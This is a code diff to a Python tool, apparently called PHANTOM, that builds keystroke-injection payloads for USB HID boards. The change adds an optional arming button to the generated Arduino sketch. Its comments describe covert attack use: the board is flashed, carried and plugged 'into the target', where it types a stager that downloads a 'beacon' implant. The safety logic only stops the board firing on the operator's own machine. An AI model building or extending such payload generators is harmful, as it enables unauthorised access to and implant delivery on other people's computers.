@@ -325,13 +325,22 @@ def _arduino_typing(command: str, layout: str) -> list:
 
 
 def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
-                    opener: Sequence[tuple], layout: str) -> str:
+                    opener: Sequence[tuple], layout: str,
+                    arm: bool = False, arm_pin: int = 7) -> str:
     """An Arduino-IDE sketch for a RAM-constrained keystroke board.
 
     ``Keyboard.print`` reads the command from PROGMEM (``F(...)``), so an
     11k-char command does not have to fit in the ~2.5 KB SRAM an ATmega32U4
     has — it only has to fit in flash, which it does. This is why a 42 KB
     board is enough for the stager: the beacon is never on the board.
+
+    With ``arm`` the board types NOTHING until the operator arms it with a
+    button on ``arm_pin``. That buys a real property — a board that fires on
+    power-up will happily type on the machine you are flashing it from, which
+    is not a rare accident, it is the default loop. But it costs a wired
+    button, and the deployment this tool is built for is flash once, unplug,
+    carry, plug into the target. So arming is opt-in: the safe-in-the-field
+    mode is the one you choose deliberately, not the one you inherit.
     """
     body = [
         "// PHANTOM HID payload — Arduino-IDE keystroke board (Keyboard.h).",
@@ -341,13 +350,45 @@ def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
     if layout != "us":
         body.append(f"// target keyboard layout: {layout} (US codes "
                     f"pre-translated)")
-    body += [
-        "#include <Keyboard.h>",
-        "",
-        "void setup() {",
-        f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
-        "  Keyboard.begin();",
-    ]
+    body += ["#include <Keyboard.h>", ""]
+    if arm:
+        body += [
+            "// SAFETY: two presses are required to fire. Plug the board in",
+            "// and it stays idle — it must not type on the machine you are",
+            "// sitting at. Wire a momentary button between ARM_PIN and GND.",
+            f"static const uint8_t ARM_PIN = {int(arm_pin)};",
+            "static const uint8_t LED_PIN = LED_BUILTIN;",
+            "",
+            "// One full press+release cycle. A button stuck down (or shorted",
+            "// to GND) never returns, so a faulty switch fails SAFE: the board",
+            "// stays silent instead of typing into the wrong machine.",
+            "static void waitPress() {",
+            "  while (digitalRead(ARM_PIN) != LOW) delay(10);",
+            "  while (digitalRead(ARM_PIN) == LOW) delay(10);",
+            "  delay(60);",
+            "}",
+            "",
+            "void setup() {",
+            "  pinMode(ARM_PIN, INPUT_PULLUP);",
+            "  pinMode(LED_PIN, OUTPUT);",
+            "  digitalWrite(LED_PIN, LOW);  // dark = not armed",
+            "",
+            f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
+            "  Keyboard.begin();",
+            "",
+            "  waitPress();                   // 1st press: arm",
+            "  digitalWrite(LED_PIN, HIGH);  // lit = armed, safe to position",
+            "  waitPress();                   // 2nd press: fire",
+        ]
+    else:
+        body += [
+            "// SAFETY ARMING NOT USED (default): this board types as soon as",
+            "// it is powered. Unplug it before flashing, or the upload runs it",
+            "// on your own machine. Use --arm if you reflash in place.",
+            "void setup() {",
+            f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
+            "  Keyboard.begin();",
+        ]
     body += _arduino_opener(opener, delay_ms)
     body += _arduino_typing(command, layout)
     if press_enter:
@@ -452,7 +493,9 @@ def build_hid_payload(board: str, command: str, *,
                       layout: str = "us",
                       delay_ms: int = DEFAULT_DELAY_MS,
                       press_enter: bool = True,
-                      open_run: bool = False) -> HidPayload:
+                      open_run: bool = False,
+                      arm: bool = False,
+                      arm_pin: int = 7) -> HidPayload:
     """Build the artefact for one board, or say why it cannot be built.
 
     ``layout`` is the layout the TARGET has active (``us``/``it``): the typed
@@ -531,7 +574,7 @@ def build_hid_payload(board: str, command: str, *,
     elif board in ARDUINO_BOARDS:
         content = _arduino_sketch(command, delay_ms=delay_ms,
                                   press_enter=press_enter, opener=opener,
-                                  layout=layout)
+                                  layout=layout, arm=arm, arm_pin=arm_pin)
         filename = "phantom_hid.ino"
     else:
         content = _circuitpython(command, delay_ms=delay_ms,
@@ -567,5 +610,8 @@ def board_notes(board: str) -> Tuple[str, ...]:
                 "a 42 KB flash board carries the stager fine because the "
                 "beacon is downloaded, never stored",
                 "F() keeps the string in flash: an ATmega-class board with "
-                "~2.5 KB of RAM still types a multi-kilobyte command")
+                "~2.5 KB of RAM still types a multi-kilobyte command",
+                "the board types as soon as it is POWERED: unplug it before "
+                "flashing, or it fires on your own machine. Use --arm if you "
+                "reflash in place (needs a button on --arm-pin to GND)")
     return ()
